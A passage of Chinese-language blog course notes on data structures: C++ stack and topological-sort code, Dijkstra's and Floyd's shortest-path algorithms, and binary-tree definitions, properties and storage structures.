S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;Init succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="type">int</span> e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(<span class="type">int</span>*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;ERROR&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line"> <span class="comment">//   cout&lt;&lt;&quot;Push succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">     <span class="comment">//   cout&lt;&lt;&quot;Stack is Empty.&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;&quot;Pop succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        <span class="type">int</span>* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// cout&lt;&lt;&quot;Stack clear succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; &quot;Stack destroyed.&quot; &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;<span class="string">&quot;-&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FindInDegree</span><span class="params">(ALGraph G, <span class="type">int</span> indegree[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;ArcNode *p;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        p=G.vertices[i].firstarc;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            indegree[p-&gt;adjvex]++;</span><br><span class="line">            p=p-&gt;nextarc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">TopologicalSort</span><span class="params">(ALGraph G)</span></span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    <span class="type">int</span> count,k,i;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    <span class="type">int</span> indegree[MAX_VERTEX_NUM]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">FindInDegree</span>(G, indegree);</span><br><span class="line">    <span class="built_in">InitStack</span>(S);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!indegree[i]) <span class="built_in">Push</span>(S, i);</span><br><span class="line">    &#125;</span><br><span class="line">    count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">StackEmpty</span>(S))&#123;</span><br><span class="line">        <span class="built_in">Pop</span>(S,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,i,G.vertices[i].data.No);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">for</span>(p=G.vertices[i].firstarc;p;p=p-&gt;nextarc)&#123;</span><br><span class="line">            k=p-&gt;adjvex;</span><br><span class="line">            <span class="keyword">if</span>(!(--indegree[k])) <span class="built_in">Push</span>(S, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count&lt;G.vexnum)<span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><h4 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h4><p>路径长度：路径上边的权值之和</p><p>最短路径：两结点间权值之和最小的路径</p><h4 id="单源最短路径Dijkstra"><a href="#单源最短路径Dijkstra" class="headerlink" title="单源最短路径Dijkstra"></a>单源最短路径Dijkstra</h4><p>给定有向图G和源点$v_i$，求$v_i$到G中其余各顶点的最短路径</p><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>按路径长度的递增次序，逐步产生最短路径Dijkstra算法(SPF算法)</p><p>首先求出长度最短的一条路径，再参照它求出长度次短的一条最短路径，以此类推，直到从顶点v到其他各顶点的最短路径全部求出为止</p><h5 id="算法要点"><a href="#算法要点" class="headerlink" title="算法要点"></a>算法要点</h5><p>例图：<img src="/2023/11/21/单源最小路径示例.png" alt="单源最小路径"><br>1.设源点$v_0$，顶点集合分成两部分：</p><p>U：已经求出最短路径的顶点集合</p><p>V-U：未求出最短路径的顶点集合</p><p>初值：U={$v_0$},V-U={$v_1$,$v_2$,$v_3$,$v_4$}</p><p>第二个加入U中的顶点必然是与$v_0$邻接且与$v_0$之间的边长最短的顶点</p><p>2.U={$v_0$,$v_2$}，V-U={$v_1$,$v_3$,$v_4$}</p><p>设第三个加入U中的顶点是w$\in$V-U,则w到$v_0$的最短路径的特点是：w是V-U中满足$v_0$-&gt;w和$v_0$-&gt;$v_2$-&gt;w中最短的</p><h5 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><h5 id="算法概要-3"><a href="#算法概要-3" class="headerlink" title="算法概要"></a>算法概要</h5><p>1.引入辅助数组D[ ],D[i]表示当前所找到的源点到每个终点i的最短路径长度，最短路径的初值即有向边的权值D[i]=G.arcs[$v_0$] [i]</p><p>​    引入辅助数组final[ ],final[i]=1表示顶点i的最短路径已经求出，否则未求出</p><p>​    初始状态：final[$v_0$]标志为1，其余为0</p><p>​    引入数组P[ ]来记录路径</p><p>2.选择D[ ]中路径最小值的顶点v(已经求出最短路的顶点除外)</p><p>​    v就是当前求得得一条从$v_0$出发的最短路径的终点，修改final[v]=1</p><p>3.修改未求出最短路径的顶点的最短路径长度，如果D[v]+G.arcs[v] [w]&lt;D[w]</p><p>​    则修改D[w]，D[w]=D[v]+G.arcs[v] [w]</p><p>​    同时修改P[w]=v</p><p>4.重复2 ，3操作 n-1次，求得最短路径长度递增序列</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  dijkstra</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITY 1000</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">struct</span> <span class="title class_">ArcCell</span> &#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">   <span class="comment">// AdjMatrix arcs;</span></span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(MGraph G,<span class="type">int</span> v0,<span class="type">int</span> *P,<span class="type">float</span> *D)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,v,w,min,f[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        f[v]=<span class="number">0</span>;</span><br><span class="line">        D[v]=G.arcs[v0][v];</span><br><span class="line">       </span><br><span class="line">        P[v]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(D[v]&lt;INFINITY) P[v]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>]=<span class="number">1</span>;P[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;D[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;f[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;P[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        min=INFINITY;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!f[w])</span><br><span class="line">                <span class="keyword">if</span>(D[w]&lt;min)&#123;v=w;min=D[w];&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f[v]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>((!f[w])&amp;&amp;(min+G.arcs[v][w]&lt;D[w]))&#123;</span><br><span class="line">                D[w]=min+G.arcs[v][w];</span><br><span class="line">                P[w]=v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pre;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%.0f:%d&quot;</span>,D[i],i); <span class="comment">//这里因为测试的都用的整数，直接舍去小数输出了</span></span><br><span class="line">        pre=P[i];</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;-%d&quot;</span>,pre);</span><br><span class="line">            pre=P[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    G.vexnum=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            G.arcs[i][j]=INFINITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">4</span>][<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">6</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">3</span>]=<span class="number">5</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">3</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">4</span>]=<span class="number">4</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">4</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="type">float</span> *D = <span class="keyword">new</span> <span class="type">float</span>[G.vexnum]; <span class="comment">// 动态分配内存</span></span><br><span class="line">    <span class="type">int</span> *P = <span class="keyword">new</span> <span class="type">int</span>[G.vexnum];</span><br><span class="line">    <span class="built_in">ShortestPath_DIJ</span>(G, <span class="number">0</span>, P,D);</span><br><span class="line">    <span class="keyword">delete</span>[] D; <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span>[] P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>Dijkstra算法的时间复杂行主要体现在求每个顶点的最短路径是，需要修改距离和求最小值，时间复杂性O($n^2$)</p><p>Dijkstra算法的空间复杂性主要体现在辅助数组，空间复杂性为O(n)</p><h4 id="每一对顶点之间的最短路径"><a href="#每一对顶点之间的最短路径" class="headerlink" title="每一对顶点之间的最短路径"></a>每一对顶点之间的最短路径</h4><p>依次把有向网络的每个顶点作为源点，重复执行Dijkstra算法n次，即可求得每对顶点之间的最短路径</p><p>Floyd算法 可以直接求出所有顶点之间的最短路径</p><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>对顶点进行编号，设顶点为0,1,…,n-1，算法采用邻接矩阵G.arcs[n] [n]表示有向网络</p><p>$D^{(-1)}[n][n]$表示中间不经过任何点的最短路径；即邻接矩阵</p><p>$D^{(0)}[n][n]$表示只允许经过0号顶点的最短路径</p><p>$D^{(1)}[n][n]$表示只允许经过0号和1号顶点的最短路径</p><p>$…….$</p><p>$D^{(n-1)}[n][n]$表示可经过所有顶点的最短路径</p><p>基本想法：动态规划算法</p><p>如果$v_i$与$v_j$之间有一条路径，但不一定最短，也许经过某些中间点会使路径长度更短，尝试在原路径中加入其他顶点作为中间顶点</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】树与二叉树</title>
      <link href="/2023/11/14/"/>
      <url>/2023/11/14/</url>
      
        <content type="html"><![CDATA[<h3 id="树的定义和基本术语"><a href="#树的定义和基本术语" class="headerlink" title="树的定义和基本术语"></a>树的定义和基本术语</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>树是n(n&gt;=0)个结点的有限集。</p><p>(1)<strong>有且仅有</strong>一个特定的称为根的结点</p><p>(2)n&gt;1时，其他结点可以分为m个不相交的有限集，其中每个集合也构成一颗树，称为根的子树。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>(1)树的根结点没有前驱，其他结点有且仅有一个前驱。</p><p>(2)树中任何一个结点可以有零或多个后继结点。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>1.结点(node)</p><p>2.结点的度(degree)</p><p>3.树的度</p><p>4.叶子或终端结点</p><p>5.非终端结点</p><p>6.父(双)亲结点(parent)</p><p>7.儿(孩)子结点(child)</p><p>8.兄弟结点(sibling)</p><p>9.路径</p><p>10.祖先</p><p>11.子孙(后代)</p><p>12.结点的层数(level)</p><p>12.树的深度(depth)或高度</p><p>14.有序树和无序树</p><p>15.森林(forest): 是m(m&gt;=0)棵互不相交的树的集合</p><h4 id="树的表示方法"><a href="#树的表示方法" class="headerlink" title="树的表示方法"></a>树的表示方法</h4><p>1.图</p><p>2.嵌套集合</p><p>3.广义表形式： (A(B(D),C))</p><p>4.凹入表示法</p><h3 id="树的有关概念"><a href="#树的有关概念" class="headerlink" title="树的有关概念"></a>树的有关概念</h3><h4 id="树的抽象数据类型"><a href="#树的抽象数据类型" class="headerlink" title="树的抽象数据类型"></a>树的抽象数据类型</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT Tree&#123;</span><br><span class="line">    数据对象D:D是具有相同特性的元素的集合。</span><br><span class="line">  数据关系R:若D为空集,则称为空树;否则:</span><br><span class="line">                  (<span class="number">1</span>)在D中存在唯一的称为根的数据元素，则R集为空;</span><br><span class="line">                (<span class="number">2</span>)当n&gt;<span class="number">1</span>时,其余结点n&gt;<span class="number">1</span>时，其他结点可以分为m个不相交的有限集，其中每个集合也是一颗符合本定义的树，称为根root的子树。</span><br><span class="line">  基本操作P:查找类、插入类、删除类操作。                                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="树的基本操作类"><a href="#树的基本操作类" class="headerlink" title="树的基本操作类"></a>树的基本操作类</h4><p>查找类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Root(T)//求树的根结点</span><br><span class="line">Value(T,cur_e)//求当前结点的元素值</span><br><span class="line">Parent(T,cur_e)//求当前结点的双亲结点</span><br><span class="line">LeftChild(T,cur_e)//求当前结点的最左孩子</span><br><span class="line">RightSibling(T,cur_e)//求当前结点的右兄弟</span><br><span class="line">TreeEmpty(T)//判断树是否为空</span><br><span class="line">TreeDepth(T)//求树的高度</span><br><span class="line">TraverseTree(T,Visit())//遍历</span><br></pre></td></tr></table></figure><p>插入类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitTree(&amp;T)//初始化置空树</span><br><span class="line">CreateTree(&amp;T,definition)//按定义构造树</span><br><span class="line">Assign(T,cur_e,value)//为当前结点赋值</span><br><span class="line">InsertChild(&amp;T,&amp;p,i,c)//将c为根的树插入为结点p的第i棵子树</span><br></pre></td></tr></table></figure><p>删除类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClearTree(&amp;T)//清空树</span><br><span class="line">DestroyTree(&amp;T)//销毁树的结构</span><br><span class="line">DeleteChild(&amp;T,&amp;p,i)删除结点p的第i棵子树</span><br></pre></td></tr></table></figure><h3 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a>二叉树的定义</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>二叉树(Binary Tree)是n(n&gt;=0)个结点的集合，这个集合可以是空集，可以是一个结点，或者是由一个根结点和两棵称为左子树和右子树的互不相交的二叉树组成。</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>1.可以为空，即不含结点</p><p>2.每个结点至多有二棵子树(二叉树中不存在度大于2的结点)</p><p>3.二叉树是有序树，子树有左右之分，次序不能任意颠倒；允许有些结点只有左子树或右子树</p><h4 id="五种基本形态"><a href="#五种基本形态" class="headerlink" title="五种基本形态"></a>五种基本形态</h4><p>如图：<img src="/2023/11/14/树的五种基本形态.png" alt="image1"></p><h4 id="二叉树与树的区别"><a href="#二叉树与树的区别" class="headerlink" title="二叉树与树的区别"></a>二叉树与树的区别</h4><p>每个结点至多两个子树，且有左右之分</p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p>1.在二叉树的第i(i&gt;=1)层上至多有$2^{i-1}$个结点</p><p>2.深度为k的二叉树最多有$2^k$-1个结点</p><p>3.对任意二叉树T，如果终端结点数为n~0~(度数为0的结点树),n~1~,n~2~分别表示度数为1，2的结点个数，则n~0~=n~2~+1</p><p>满二叉树：</p><p>一个二叉树的叶子结点都在最后一层上，且不存在度数为1的结点</p><p>设高为k则有$2^k$-1个结点</p><p>特点：</p><p>1.对给定的高度，满二叉树有最多结点</p><p>2.不存在度为1的结点</p><p>3.每个分支都有两颗高度相同的子树</p><p>4.叶子结点都在最后一层</p><p>(重点)<strong>完全二叉树</strong>：如果存在一颗二叉树，对树中结点自上而下，自左而右连续编号，若编号为i的结点的位置与满二叉树中i的结点的位置相同，则称此二叉树为完全二叉树。</p><p>特点：</p><p>1.叶子结点只可能在<strong>层树最大的两层</strong>上出现</p><p>2.对任意结点，若有右子树则必有左子树</p><p>3.具有n个结点的完全二叉树深度为$\lfloor log_2n\rfloor$+1（向下取整）或者$\lceil log_2(n+1)\rceil$(向上取整)</p><p>4.对于一个具有n个结点的完全二叉树，其结点按层序编号，则对任意结点k~i~(1$\leq$i$\leq$n)：</p><p>已知编号i(1$\leq$i$\leq$n)，双亲结点是$\lfloor i/2 \rfloor$</p><p>已知编号i(1$\leq$i$\leq$n/2)，左孩子结点为2i</p><p>已知编号i(1$\leq$i$\leq$(n-1)/2)，左孩子结点为2i+1</p><p>已知编号i(i为奇数,且1&lt;i&lt;n),左兄弟结点为i-1</p><p>已知编号i(i为偶数,且1&lt;i&lt;n),左兄弟结点为i+1</p><h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h4><p>利用完全二叉树的性质，可以将完全二叉树存入向量b[n]中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> TElemType SqBiTree[MAX_TREE_SIZE];</span><br><span class="line">SqBiTree bt;<span class="comment">//和TElemType bt[100]相同</span></span><br></pre></td></tr></table></figure><p><img src="/2023/11/14/顺序存储结构.png" alt="image2"></p><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th></tr></thead><tbody><tr><td>31</td><td>23</td><td>12</td><td>66</td><td>$\emptyset$</td><td>05</td><td>17</td><td>70</td><td>62</td><td>$\emptyset$</td><td>$\emptyset$</td><td>$\emptyset$</td><td>88</td><td>$\emptyset$</td><td>55</td></tr></tbody></table></div><p>顺序存储方式对于畸形二叉树，浪费空间</p><h4 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h4><p>每个结点中，设置两个链域指向左孩子和右孩子，一个数据域，若没有左孩子或右孩子，则指针指向NULL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><p>n个结点的二叉树中，共有n+1个空域</p><p>二叉链表很难找到双亲</p><p>三叉链表(带双亲的二叉链表) 含四个域：数据域，左指针域，右指针域，双亲域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>,*<span class="title">parent</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><h4 id="二叉树的生成"><a href="#二叉树的生成" class="headerlink" title="二叉树的生成"></a>二叉树的生成</h4><p>递归创建</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BiTNode* <span class="title">CreateBiTree</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> n, <span class="type">int</span> &amp;i,<span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;size&amp;&amp;a[i]!=n)</span><br><span class="line">    &#123;</span><br><span class="line">        BiTNode* newNode = <span class="built_in">InitBtNode</span>(a[i]);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;lch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;rch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        <span class="keyword">return</span> 